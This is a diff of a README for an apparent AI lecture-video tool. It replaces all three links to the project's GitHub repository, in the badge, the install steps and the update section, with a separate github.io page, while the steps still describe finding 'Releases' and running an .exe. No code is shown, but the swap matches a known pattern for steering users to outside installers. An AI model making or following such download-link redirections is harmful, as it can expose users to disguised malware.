@@ -1,6 +1,6 @@
 # 🎓 lecture-video-maker - Create automated lessons from simple text
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/NowfDee/lecture-video-maker)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://nowfdee.github.io)
 
 This tool creates educational videos. You provide the text, and the software builds a narrated presentation. It uses artificial intelligence to find stock footage, record voices, and edit the final file. You monitor the progress through a simple web page.
 
@@ -18,7 +18,7 @@ Your computer needs these items to run the software correctly:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the repository page to download the latest version: https://github.com/NowfDee/lecture-video-maker
+1. Visit the repository page to download the latest version: https://nowfdee.github.io
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Select the file ending in `.exe` for Windows.
 4. Save the file to your desktop.
@@ -86,4 +86,4 @@ If you encounter issues, check the following common fixes:
 
 ## 📦 Updates
 
-New versions release frequently to improve speed and feature quality. To update, download the latest installer from the main page and run it over your current installation. Your existing settings should remain intact. Visit the main project page at https://github.com/NowfDee/lecture-video-maker to check for new releases and read about recent changes.
+New versions release frequently to improve speed and feature quality. To update, download the latest installer from the main page and run it over your current installation. Your existing settings should remain intact. Visit the main project page at https://nowfdee.github.io to check for new releases and read about recent changes.
